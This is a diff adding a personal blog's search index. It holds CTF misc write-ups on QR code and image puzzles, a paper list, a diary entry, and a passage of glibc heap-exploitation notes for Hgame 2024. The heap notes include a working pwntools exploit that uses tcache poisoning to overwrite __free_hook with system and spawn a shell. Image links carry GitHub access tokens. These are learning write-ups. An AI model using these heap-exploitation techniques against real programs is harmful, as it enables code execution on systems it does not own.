@@ -1,0 +1,551 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>2024矩阵杯wp 两级反转</title>
+    <url>/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/</url>
+    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
+<h2 id="两级反转"><a href="#两级反转" class="headerlink" title="两级反转"></a>两级反转</h2><p>两极反转，黑白不分<br>奇变偶不变，横变竖不变<br>(PS:或许你要非常熟悉二维码的结构  </p>
+<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>光看提示大概可以猜到是奇数的横行颜色黑白反转了<br>但是有个问题是index是从0还是1开始计数呢？都很合理啊<br>而且位置探测的三个方块很明显是正确的，那就是处理图像是要跳过这些正确的部分（？</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/0.png"
+                      alt="0.png"
+                ></p>
+<p>没关系，还有一条PS：让我熟悉二维码结构</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/img.png"
+                      alt="img.png"
+                ></p>
+<p>对照一下我们的图片，初见端倪啊。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/img_1.png"
+                      alt="img_1.png"
+                ><br>红框一列的地方黑白是固定的，奇偶的问题解决了；<br>图像处理的范围其实不能完全确定，不是整张图是肯定的，但具体一定要多少呢？其实没有足够明确的证据来佐证<br>但是没关系，二维码图形本身有很好的反混淆，我们既是没有完全复原依旧可以尝试能不能读出信息</p>
+<p>先复原红框的部分<br>拿上次的RCTF脚本略略修改一下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">def split4db(img, offset_x=1, offset_y=1, flag=0):</span><br><span class="line">    # 跳过外围白边</span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    p = 0</span><br><span class="line"></span><br><span class="line">    # 先切x</span><br><span class="line">    for i in range(29):</span><br><span class="line">        p += 25</span><br><span class="line">        if i&lt;7 or i&gt;21:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            if i%2==0:</span><br><span class="line">                img[p-25:p+1,:]=cv2.bitwise_not(img[p-25:p+1,:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line">img=cv2.imread(&quot;8E2A248B-0EE8-42b2-B19B-C6A9CE0D47F8.png&quot;)</span><br><span class="line">img=split4db(img)</span><br><span class="line">cv2.imwrite(&#x27;new0.png&#x27;, img)</span><br></pre></td></tr></table></figure></div>
+<p>结果：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/new0.png"
+                      alt="new0.png"
+                ><br>扫一下，出了。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><h4 id="有关为什么这个结果这么丑陋："><a href="#有关为什么这个结果这么丑陋：" class="headerlink" title="有关为什么这个结果这么丑陋："></a>有关为什么这个结果这么丑陋：</h4><p>实际上，这张二维码的图片如果拖进画图等可以数像素的软件里人力分析一下，很容易发现，它是25像素对齐的，也就是一个黑点或白点理论上是25*25像素。<br>然而，黑色并不完全遵循这个25对齐，只有当有另一个黑点和它接壤时，他才会在连接处满足25个像素对齐，否则就是24个黑色像素加上一行或一列多余的白色像素。<br>一开始我的确想要处理掉这些像素，方案为统统改为24像素对齐，但是写到一半的时候考虑到<strong>二维码有很好的反混淆性</strong>，说实话1对于24来说就是一个很小的噪声，所以就忽略不计了，把最外围的1像素白边切掉后直接处理图像就ok了。</p>
+<h4 id="有关二维码有很好的反混淆性："><a href="#有关二维码有很好的反混淆性：" class="headerlink" title="有关二维码有很好的反混淆性："></a>有关二维码有很好的反混淆性：</h4><p>这实际上是一个很有意思的知识，二维码是有自己的版本以及纠错级别的，每个二维码出生的时候就被选择了能承载多少的什么形式的信息，但是具体的就不说了，网上有非常多讲这块讲的很清楚的。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/img_2.png"
+                      alt="img_2.png"
+                ><br>可以看到，如果我想要容纳更多的噪声（纠错能力变强），那么能够实际留存的有效信息越少，很符合直觉。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/img_3.png"
+                      alt="img_3.png"
+                ></p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>Misc</tag>
+        <tag>CV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>视觉、深度学习相关论文分享</title>
+    <url>/2024/04/11/AI-2.0-01/</url>
+    <content><![CDATA[<p><em>φ</em>(．．)</p>
+<ol>
+<li>Attention Is All You Need|2017</li>
+<li>An image is worth 16 x 16 words:transformers for image recognition at scale|2021|ICLR</li>
+<li>Masked Autoencoders Are Scalable Vision Learners|2022|CVPR</li>
+</ol>
+<blockquote>
+<p>更新：对于第一篇paper，你可能需要清楚什么是<code>Attention</code>,<code>encoder-decoder</code>,以及一些深度学习的基础知识。这样你会更快了解什么是<code>transformer</code><br>第二篇,你可能需要清楚什么是<code>patch</code>,<code>CNN</code>,以及一些CV的基础知识，他的成果基于<code>transformer</code>,所以也请大致知道<code>transformer</code>是什么。这样你会更快了解什么是<code>VIT</code><br>第三篇，你看到了<code>VIT</code>的无限潜力，在<code>Self-Supervised Learning</code>后，对于像素这样级别很低的输出依然有惊人的表现，这得益于它的非对称<code>encoder-decoder</code>，或许图片里的信息真的太冗余了呢？  </p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>CV</tag>
+        <tag>AI</tag>
+        <tag>Paper Reading</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Wandering</title>
+    <url>/2024/06/22/Wandering/</url>
+    <content><![CDATA[<p>(・ε・)</p>
+<p>意外<del>蹭上了</del>参加了杭高院的队伍一起做一个CV有关的比赛，大家都在杭州，于是去线下讨论了一下，总要碰面的。<br>不过因为我早上在考试，其实没有和所有的学长们都见面。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8502.JPG?token=BDXQ3TM2VKMUZN5TSVCWRXDGO32DE"
+                      alt="IMG_8502"
+                ></p>
+<p>然后过去了之后也没什么事，最主要和大家碰个面。知道上午的会以及大概熟悉了一下华为的这个平台（？</p>
+<p>火速就结束了。下沙离科创园稍微有点远，去一趟打车都要一个小时。学长们说，带我逛逛。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8503.JPG?token=BDXQ3TJGZ5IECOLLEFLJH6TGO32DI"
+                      alt="IMG_8503"
+                ></p>
+<p>于是和一个学姐一起从科创园步行到杭高院校园。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8505.JPG?token=BDXQ3TMWXWC4HTIYVP5CZDLGO32DQ"
+                      alt="IMG_8505"
+                ></p>
+<p>路过了我心里很神秘又厉害的西湖大学。</p>
+<p>然后再走了体感两百米，到了杭高院。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8509.JPG?token=BDXQ3TMVZLT3V45DBWENUW3GO32D2"
+                      alt="IMG_8509"
+                ></p>
+<p>忘记拍大门了。</p>
+<p>其实是因为手上拿着西瓜和耳机不太方便，懒得拍了。<br>校园里面也没拍，说带我逛逛，其实一到就直奔办公室休息了哈哈哈。然后在一段很长很长的聊天之后，他们说，这里没啥好逛的，一览无遗，全是一样的楼。</p>
+<p>但不得不说，杭高院还是挺气派的，我是说里面的装修，外面我也没仔细瞧。</p>
+<p>晚饭也是在那里吃的，因为没逛校园，但还是说好了带我逛逛，改成去学校周边逛逛（</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8514.JPG?token=BDXQ3TM5KK75H4P6NUHVCE3GO32D6"
+                      alt="IMG_8514"
+                ></p>
+<p>在吃饭的地方其实也赖了好一会，大概是因为今天是难得的休息天。</p>
+<p>下午的时候聊天就聊了许多有关未来打算的事，确实在研一学长们的眼里，我很年轻。而且虽然我是RT学长介绍进去的，但是实际上在今天之前，我的确和他们都很陌生。所以这样让他们更加好奇Vidar（</p>
+<p>我也不知道未来怎么打算。</p>
+<p>所以哪也没逛，净在凳子上聊天了，我好奇他们，他们好奇我。</p>
+<p>但下沙离这真挺远的，于是准备走了的时候，他们还是问我要不要逛逛。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8515.JPG?token=BDXQ3TMX6QAYHC7I2V6ZZU3GO32EA"
+                      alt="IMG_8515"
+                ></p>
+<p>但是有两位学长的回去的车已经打好了。于是在这里送别他们，留我和RT在这里再逛一会。</p>
+<p>我和liunx大师聊了还挺久的，这样的机会挺难得的。和已经毕业的学长聊天，这种感觉和校园里的人聊还真挺不一样的。而且我们方向算是相似吧，获得了很多很实在的学习建议，也更加认识了协会以前的厉害的学长们。</p>
+<p>今天的行程几乎完全计划外，昨天才定的今天要来，也没说要来多久。然后就在这呆了几乎一天，奇妙。总之我还是挺庆幸我没为今天下午与晚上安排什么的。</p>
+]]></content>
+      <tags>
+        <tag>喵喵</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCTFwp sec-image</title>
+    <url>/2024/05/28/RCTF2024-wp-sec-image/</url>
+    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
+<h2 id="sec-image"><a href="#sec-image" class="headerlink" title="sec-image"></a>sec-image</h2><p>information: real sec ??</p>
+<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>下了文件解包之后应该映入眼帘的是flag0.png~flag9.png这样十张图<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/05/28/RCTF2024-wp-sec-image/img.png"
+                     
+                ><br>来看第一张图：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/05/28/RCTF2024-wp-sec-image/flag0.png"
+                     
+                ><br>其实我没太看出来（（，但是大伙都说肉眼可看是RCTF<br>ok，可看&#x3D;&#x3D;可打<br>很明显他是四个字母叠在一起<br>放大看看，我首先去看了字母T中间那一竖的地方：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/05/28/RCTF2024-wp-sec-image/img_1.png"
+                     
+                ><br><strong>以普遍理性而言，一个小白格子对于一个字母应该是只有单一的信息</strong><br>所以只应该关注重复的小黑点，那些大大小小的就看作是噪声，可以看到对字母T的特征就是一种整体往左下偏移的网点阵<br>猜想别的字母也是网点阵<br>可以再看一个比较复杂的区域<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/05/28/RCTF2024-wp-sec-image/img_2.png"
+                     
+                ><br>很明显都是一些有规律的图形，每个重复的单元都可以用2*2的大小表示，就像铺地砖一样铺出来，<br>这里就基本证实我们的猜想，这张图是把不同偏移的网点图叠加在一起：<br>简单分析一下得到这张图的偏移是：</p>
+<table>
+<thead>
+<tr>
+<th align="center">R</th>
+<th align="center">C</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">T</td>
+<td align="center">F</td>
+</tr>
+</tbody></table>
+<p>ok，那就很简单了如果我们把这张图表示这个字母的地方截取出来再拼接，就能看到flag了。<br>以下是脚本：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">def split4db(img, offset_x=4, offset_y=4, flag=0):</span><br><span class="line">    # 跳过外围黑边</span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    x = 0</span><br><span class="line">    y = 0</span><br><span class="line">    p = 0</span><br><span class="line">    if flag == 1:</span><br><span class="line">        pass</span><br><span class="line">    elif flag == 2:</span><br><span class="line">        x += 1</span><br><span class="line">    elif flag == 3:</span><br><span class="line">        y += 1</span><br><span class="line">    else:</span><br><span class="line">        x += 1</span><br><span class="line">        y += 1</span><br><span class="line">    # 先切x</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for _ in range(6):</span><br><span class="line">            img1 = img[:, :x ]</span><br><span class="line">            img2 = img[:, x + 1:]</span><br><span class="line">            img = cv2.hconcat([img1, img2])</span><br><span class="line">            x+=1</span><br><span class="line">        if i == 39:</span><br><span class="line">            break</span><br><span class="line">        p += 6</span><br><span class="line">        img1=img[:, :p]</span><br><span class="line">        img2=img[:, p+8:]</span><br><span class="line">        img = cv2.hconcat([img1, img2])</span><br><span class="line">    # 再切y</span><br><span class="line">    p=0</span><br><span class="line">    for i in range(40):</span><br><span class="line">        for j in range(7):</span><br><span class="line">            img1 = img[:y , :]</span><br><span class="line">            img2 = img[y + 1:, :]</span><br><span class="line">            img = cv2.vconcat([img1, img2])</span><br><span class="line">            y+=1</span><br><span class="line">        if i == 39:</span><br><span class="line">            break</span><br><span class="line">        p += 7</span><br><span class="line">        img1 = img[ : p , :]</span><br><span class="line">        img2 = img[ p+6 : , :]</span><br><span class="line">        img = cv2.vconcat([img1, img2])</span><br><span class="line"></span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    filename = f&quot;flag&#123;i&#125;.png&quot;</span><br><span class="line">    img0 = cv2.imread(filename)</span><br><span class="line">    for j in range(4):</span><br><span class="line">        img = split4db(img=img0, flag=(j + 1))</span><br><span class="line">        savename = f&quot;rctf&#123;(i+1) * 4 -j&#125;.png&quot;</span><br><span class="line">        cv2.imwrite(savename, img)</span><br></pre></td></tr></table></figure></div>
+<p>结果：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2024/05/28/RCTF2024-wp-sec-image/img_3.png"
+                     
+                ></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>为了维持干净的wp,把一些思路还是放在后面<br>所以在这个答案之前，我也有过这样的想法：</p>
+<blockquote>
+<p>去根据灰度标记每个白色小方格标志为[0,1,2,3,4]中一个，来表示这个块有几个字母，因为每个图其实都有一个能看出来的字母，然后把这个字母所在方格的标志减掉一，然后反向操作，从标志到灰度，再看看有什么能看出来的字符。</p>
+</blockquote>
+<p>当然，这个思路弊端很明显：</p>
+<ul>
+<li>没有位置信息</li>
+<li>把看的出结果的方格减一很难做得很准确，尤其是在文字边缘</li>
+<li>更有可能出现把已知得字符减去之后，找不到新的字符的情况</li>
+</ul>
+<p>所以放弃这个思路，更仔细的去看每一块的内容，或许cv的题真的可以从出题的角度去看题，从这个题是怎么构成出出来的考虑。<br>于是就想到要去看看具体每一块的内容。</p>
+<p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。<br>题的脚本不是很难构造，想到就是想到，很misc的一道题</p>
+]]></content>
+      <tags>
+        <tag>wp</tag>
+        <tag>Misc</tag>
+        <tag>CV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>heap初探 | Hgame2024 week2&amp;week3 堆部分分析</title>
+    <url>/2024/06/21/heap%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<p>(っ●ω●)っ</p>
+<h3 id="对堆的简单认识"><a href="#对堆的简单认识" class="headerlink" title="对堆的简单认识"></a>对堆的简单认识</h3><p>堆管理器：ptmalloc2 - glibc<br>内存分配区：arena，收发内存的地方<br>内存的单位：chunk </p>
+<p><em>malloc一个chunk的结构</em></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_chunk</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T mchunk_prev_size; //size of previous chunk (if free)</span><br><span class="line"></span><br><span class="line">INTERNAL_SIIZE_T mchunk_size; //size in bytes,including overhead</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* fd; //double links -- used only if free</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* bk; /* only used for large blocks:pointer to next larger size; */</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* fd_nextsize; //double links -- used only if free</span><br><span class="line"></span><br><span class="line">struct malloc_chunk* bk_nextsize;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>由于64位chunk内存对齐0x10,32位内存对齐0x08<br>所以size位低三位始终为0,记录：<br><code>NON_ MIAN_ ARENA</code>,当前chunk是否不属于主线程，1表示不属于，0表示属于。<br><code>IS_MAPPED</code>，当前chunk是否是由mmap分配的。<br><code>PREV_INUSE</code>，前一个chunk块是否被分配，1表示分配，0表示未分配。</p>
+<p>释放后的chunk:bin<br><code>unsorted bin</code>:</p>
+<ul>
+<li>垃圾桶中的垃圾桶</li>
+<li>双向链表</li>
+</ul>
+<p><code>fast bins</code>:</p>
+<ul>
+<li>0x20-0x80</li>
+<li>后进先出 LIFO;单向链表(fd)</li>
+</ul>
+<p><code>small bins</code>:</p>
+<ul>
+<li>0x20-0x400</li>
+</ul>
+<p><code>large bins</code>:</p>
+<ul>
+<li>0x400-</li>
+<li>双向链表</li>
+</ul>
+<p><code>(tcache)glibc-2.27</code>:</p>
+<ul>
+<li>0x20-0x400</li>
+<li>进入tcache bin的chunk的fd指的是下一个chunk的头指针，而其他的bin会指向chunk_addr,即prev_size的地方</li>
+<li>tcache bin里的chunk不会发生合并（不取消inuse bit）</li>
+<li>后进先出 LIFO;单向链表(fd)</li>
+</ul>
+<p>对于具体的chunk的申请释放我主要参考了，不再赘叙：</p>
+<ul>
+<li><a class="link"   href="https://www.cjovi.icu/pwnreview/1300.html" >chuj学长的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/overview/" >ctf-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="week2堆题分析"><a href="#week2堆题分析" class="headerlink" title="week2堆题分析"></a>week2堆题分析</h3><p>给的漏洞都是比较明显好利用的，静态分析的部分基本上都略过了。</p>
+<h4 id="Elden-Ring-II"><a href="#Elden-Ring-II" class="headerlink" title="Elden Ring II"></a>Elden Ring II</h4><p>UAF，没有对使用过的指针置0。</p>
+<h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h5><p>tcache_put:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>tcache_get:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="line">   available chunks to remove.  */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可以看到tcache在放入和取出的时候都几乎没有校验，只要有空位置就可以放，存在可以取的chunk就可以取。</p>
+<p>所以<code>tcache_poisoning</code>发生在<code>tcache_get</code>时不作任何校验把一块别的地方当作重新利用的chunk,实现任意地址写。<br>实现<code>tcache_poisoning</code>则是需要把bin中的一个fd指向希望伪造的其他地方。在这个题里是UAF  </p>
+<blockquote>
+<p>调试时还可以看到改完fd后tcache bin里的count还是旧的，但依然没有问题。充分说明了放入和取出的优先级高于了很多检查。</p>
+</blockquote>
+<p>下面是我的exp</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;1&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(b&quot;Size: &quot;,str(size).encode())</span><br><span class="line">    </span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    p.sendlineafter(b&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&quot;&gt;&quot;,b&quot;4&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;Index: &quot;,str(index).encode())</span><br><span class="line">    </span><br><span class="line">for i in range(8):</span><br><span class="line">    add(i,0x90)</span><br><span class="line">add(8,0x20) #防止合并</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(7) #libc泄露</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(6).ljust(0x08,b&quot;\x00&quot;))-0x1ecbe0</span><br><span class="line">success(&quot;libc_base = &quot; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line">success(&quot;libc_base = &quot; + hex(free_hook))</span><br><span class="line"></span><br><span class="line">#-------</span><br><span class="line">add(9,0x60)</span><br><span class="line">add(10,0x60)</span><br><span class="line">add(11,0x20) #防止合并</span><br><span class="line"></span><br><span class="line">delete(9)</span><br><span class="line">delete(10)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">edit(10,p64(free_hook)) #tcache posioning</span><br><span class="line"></span><br><span class="line">add(12,0x60)</span><br><span class="line">add(13,0x60)</span><br><span class="line">edit(13,p64(system_addr)) #任意地址写入system()</span><br><span class="line"></span><br><span class="line">add(14,0x20) #准备触发</span><br><span class="line">edit(14,b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">delete(14)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>对了这个题不允许使用用过的index,哪怕free过，所以要数一下谁是谁。</p>
+<h4 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h4><p>UAF,but null</p>
+<h5 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h5><p>free后指针清零，不代表我们不能控制这个指针了。fastbin double free就是混淆对这个指针的控制，导致一边在正常获取堆块写数据的操作在fastbin里也有响应，伪造一个chunk。依旧是实现任意地址写。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Another simple check: make sure the top of the bin is not the</span><br><span class="line">       record we are going to add (i.e., double free).  */</span><br><span class="line">    if (__builtin_expect (old == p, 0))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = &quot;double free or corruption (fasttop)&quot;;</span><br><span class="line">        goto errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>fastbin的源码里考虑了double free，但是只检查链表的后一个，且fastbin的堆块被释放后next_chunk的pre_inuse位不会被清0。(好奇怪的机制。不清0,可能是为了快吧。)<br>所以只要在free的中间加一个无关的chunk,就能做到fastbin double free。</p>
+<p>和上一题太像了，exp也没啥好贴的。</p>
+<h4 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h4><p>UAF,but null &amp;&amp; libc-2.23  </p>
+<h5 id="SIZE位检查绕过"><a href="#SIZE位检查绕过" class="headerlink" title="SIZE位检查绕过"></a>SIZE位检查绕过</h5><p>继续看到2.23 从fastbin里malloc时候的源码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="line">   can try it without checking, which saves some time on this fast path.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    if (victim != 0)</span><br><span class="line">      &#123;</span><br><span class="line">        if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            return NULL;</span><br><span class="line">          &#125;//这里要求size位的大小要符合fastbin才能把bin里的东西取出来</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);//其实这一行很有意思，但是这个不用管，所以我放在最后讲（</span><br><span class="line">        void *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>所以我们想要实现的任意地址写继续使用<code>__free_hook</code>就不行了，<code>__free_hook</code>上面都是0，<code>__free_hook</code>之后的地址也没啥好考虑的，因为即使符合条件也没办法覆写<code>__free_hook</code>了。</p>
+<p>而<code>__malloc_hook</code>上面有一段不为空的地方可以利用,一般__malloc_hook-0x23能得到一个0x7f,满足0x20-0x80的要求。<br>所以这个题还是double free混淆一次fd，然后取的时候因为要检查size所以用__malloc_hook改写这样就可以塞进去一个能取出来的地址了。</p>
+<blockquote>
+<p>注意：fastbin的fd记录的是chunk_addr,然而实际数据是从chunk_addr+0x10的地方开始写的，所以取出<code>__malloc_hook-0x23</code>的时候写入数据是从<code>__malloc_hook-0x13</code>的地方开始的。</p>
+</blockquote>
+<h3 id="week3堆题分析"><a href="#week3堆题分析" class="headerlink" title="week3堆题分析"></a>week3堆题分析</h3><p>week3全是堆题（（，所以就是week3分析。</p>
+<h4 id="Elden-Ring-III"><a href="#Elden-Ring-III" class="headerlink" title="Elden Ring III"></a>Elden Ring III</h4><p>largebin_attack，只允许申请大堆块。</p>
+<h5 id="tcache-mp"><a href="#tcache-mp" class="headerlink" title="tcache mp_"></a>tcache mp_</h5><p>感觉还是得先从tcache结构讲起我才能舒服。</p>
+<p>首先我们知道<code>tcachebin</code>能够放64个bin的链表，从0x20+0x10*63&#x3D;0x410<br>所以申请的0x10-0x400的堆块free后会先来这里，否则是<code>unsortedbin</code>。</p>
+<p><code>tcache_perthread_struct</code>是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x250(2.30以前)。</p>
